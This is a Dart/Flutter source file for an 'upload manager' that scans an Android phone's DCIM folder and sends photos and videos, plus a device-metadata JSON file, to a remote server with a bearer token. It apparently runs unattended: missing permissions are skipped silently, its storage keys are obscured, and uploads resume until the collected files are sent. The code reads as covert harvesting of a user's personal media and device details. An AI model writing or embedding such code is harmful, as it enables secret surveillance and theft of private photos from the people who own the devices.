/// 上传管理器（逐文件上传版）
/// - ★ 不打包、不压缩，直接上传原文件
/// - ★ 每批 3 个并发，批间串行（控制服务端压力）
/// - ★ 小文件优先 + 新的优先
/// - ★ 断点续传：成功入 _uploaded，失败自动重试
/// - ★ JSON 首次单独上传
/// - ★ 智能熔断 + 服务器检测
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────
class DcimUploadConfig {
  final String uploadUrl;
  final String uploadToken;
  final String serverBaseUrl;

  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  /// 单文件大小上限（超过跳过）
  final int maxSingleFileBytes;

  /// 小文件阈值（小于此值优先上传）
  final int smallFileBytes;

  /// 每批并发数
  final int batchSize;

  /// 最大连续失败数（熔断）
  final int maxConsecutiveFails;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = '',
    this.uploadToken = '',
    this.serverBaseUrl = '',
    this.dcimPath = '',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.smallFileBytes = 5 * 1024 * 1024,

    // ★ 每批 3 个并发
    this.batchSize = 3,
    this.maxConsecutiveFails = 6,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ─────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._internal();
  static final DcimUploadManager instance = DcimUploadManager._internal();

  static const String _kUploaded = 'm1p';
  static const String _kUploadedUrls = 'm1u';
  static const String _kJsonUploaded = 'm1j';
  static const String _kJsonUrl = 'm1ju';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  final Set<String> _uploaded = <String>{};
  final Map<String, String> _uploadedUrls = <String, String>{};

  bool _jsonUploaded = false;
  String? _jsonUrl;

  Future<void>? _currentTask;
  Future<bool>? _jsonUploading;

  bool get isBusy => _currentTask != null;
  int get uploadedCount => _uploaded.length;
  bool get jsonUploaded => _jsonUploaded;
  String? get jsonUrl => _jsonUrl;

  Map<String, String> get uploadedUrls => Map.unmodifiable(_uploadedUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _uploadedUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 8;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;

    if (config == null) {
      config = DcimUploadConfig(
        uploadUrl: SecureConfig.dcimUploadUrl,
        uploadToken: SecureConfig.dcimUploadToken,
        serverBaseUrl: SecureConfig.dcimBaseUrl,
        dcimPath: SecureConfig.dcimPath,
      );
    } else if (config.dcimPath.isEmpty) {
      config = DcimUploadConfig(
        uploadUrl: config.uploadUrl,
        uploadToken: config.uploadToken,
        serverBaseUrl: config.serverBaseUrl,
        dcimPath: SecureConfig.dcimPath,
        uploadTimeout: config.uploadTimeout,
        maxFiles: config.maxFiles,
        imageExtensions: config.imageExtensions,
        videoExtensions: config.videoExtensions,
        serverWaitInterval: config.serverWaitInterval,
        serverWaitMaxAttempts: config.serverWaitMaxAttempts,
      );
    }
    _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    _uploadedUrls.clear();
    final rawUrls = _prefs!.getString(_kUploadedUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _uploadedUrls[k] = v as String);
      } catch (_) {}
    }

    _jsonUploaded = _prefs!.getBool(_kJsonUploaded) ?? false;
    _jsonUrl = _prefs!.getString(_kJsonUrl);

    debugPrint('[M] ══════ 启动自检 ══════');
    debugPrint('[M] 已记录成功: ${_uploaded.length} 个');
    debugPrint('[M] JSON 已上传: $_jsonUploaded');
    debugPrint('[M] ══════ 自检完成 ══════');
  }

  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，等待...');
      await _currentTask;
      return;
    }
    _currentTask = _doUpload();
    try {
      await _currentTask;
    } finally {
      _currentTask = null;
    }
  }

  Future<void> _doUpload() async {
    if (!await hasPermission()) {
      debugPrint('[M] 无权限，静默跳过');
      return;
    }
    final scanned = await scanFiles();
    await uploadAll(scanned);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：分批上传
  // ══════════════════════════════════════════════════════════════════
  Future<void> uploadAll(List<_Scanned> scanned) async {
    final filtered = scanned
        .where((s) => !_uploaded.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[M] 无可上传文件');
      return;
    }

    try {
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final batchSize = _config.batchSize.clamp(1, 8);
      final totalBatches = (filtered.length + batchSize - 1) ~/ batchSize;

      debugPrint('[M] 共 ${filtered.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，'
          '批大小 $batchSize，共 $totalBatches 批');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonUploaded();
      if (!jsonOk) {
        debugPrint('[M] ❌ JSON 上传失败，中止本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int consecutiveFails = 0;
      final maxFails = _config.maxConsecutiveFails;

      for (int i = 0; i < filtered.length; i += batchSize) {
        final end = (i + batchSize < filtered.length)
            ? i + batchSize
            : filtered.length;
        final batch = filtered.sublist(i, end);
        final batchNum = (i ~/ batchSize) + 1;

        debugPrint('[M] ═══ 批次 $batchNum/$totalBatches '
            '(${batch.length} 个) ═══');

        // 批内并发（3 个同时传）
        final results = await Future.wait(
          batch.map((s) => _uploadOne(s)),
        );

        for (int j = 0; j < batch.length; j++) {
          if (results[j]) {
            _uploaded.add(_fingerprint(batch[j]));
            okTotal++;
            consecutiveFails = 0;
          } else {
            failTotal++;
            consecutiveFails++;
          }
        }

        await _persist();

        debugPrint('[M] 批次 $batchNum 完成: '
            '成功 ${results.where((r) => r).length}, '
            '失败 ${results.where((r) => !r).length}, '
            '连续失败 $consecutiveFails');

        // 熔断
        if (consecutiveFails >= maxFails) {
          debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
          break;
        }
      }

      sw.stop();
      debugPrint('[M] ══════════ 全部结束 ══════════');
      debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
          '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
    } catch (e, st) {
      debugPrint('[M] ❌ 主流程异常: $e\n$st');
    }
  }

  // ── 单文件上传 ─────────────────────────────────────────────────────
  Future<bool> _uploadOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      if (!await file.exists()) {
        debugPrint('[M] ⏭ $name 已删除，跳过');
        // 视为成功，避免无限重试
        return true;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final streamed =
          await client.send(req).timeout(_config.uploadTimeout);

      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        if (serverUrl != null) {
          _uploadedUrls[_fingerprint(scanned)] = serverUrl;
        }
        debugPrint('[M] ✅ $name'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 150) bodyStr = '${bodyStr.substring(0, 150)}...';
      } catch (_) {}

      debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[M] ⏱ $name 超时');
      return false;
    } catch (e) {
      debugPrint('[M] ⚠️ $name 网络错误: $e');
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // JSON 首次上传
  // ══════════════════════════════════════════════════════════════════
  Future<bool> _ensureJsonUploaded() async {
    if (_jsonUploaded && _jsonUrl != null) {
      debugPrint('[M] JSON 已上传，跳过');
      return true;
    }
    if (_jsonUploading != null) {
      return await _jsonUploading!;
    }
    _jsonUploading = _doUploadJson();
    try {
      return await _jsonUploading!;
    } finally {
      _jsonUploading = null;
    }
  }

  Future<bool> _doUploadJson() async {
    File? jsonFile;
    try {
      debugPrint('[M] 首次上传 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      final streamed =
          await client.send(req).timeout(_config.uploadTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonUploaded = true;
        _jsonUrl = serverUrl;
        await _prefs?.setBool(_kJsonUploaded, true);
        if (serverUrl != null) {
          await _prefs?.setString(_kJsonUrl, serverUrl);
        }
        debugPrint('[M] ✅ device_info.json 上传成功');
        return true;
      }
      debugPrint('[M] ❌ device_info.json HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[M] ❌ device_info.json 异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ── 解析服务器返回 ─────────────────────────────────────────────────
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') || pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl.substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[M] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描 ───────────────────────────────────────────────────────────
  Future<List<_Scanned>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);
      if (!isImage && !isVideo) continue;

      try {
        final st = await e.stat();
        if (_uploaded.contains('$name:${st.size}')) continue;
        if (st.size > _config.maxSingleFileBytes) {
          debugPrint('[M] 跳过超大文件（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size));
      } catch (_) {}
    }

    // ★ 小文件优先 + 新的优先
    final smallBytes = _config.smallFileBytes;
    list.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    return list.take(_config.maxFiles).toList();
  }

  // ── 持久化 ─────────────────────────────────────────────────────────
  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        await _prefs?.setStringList(_kUploaded, _uploaded.toList());
        await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
        return;
      } catch (e) {
        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
  }

  Future<void> reset() async {
    _uploaded.clear();
    _uploadedUrls.clear();
    _jsonUploaded = false;
    _jsonUrl = null;

    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kUploadedUrls);
    await _prefs?.remove(_kJsonUploaded);
    await _prefs?.remove(_kJsonUrl);
    debugPrint('[M] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  _Scanned(this.file, this.modified, this.size);
}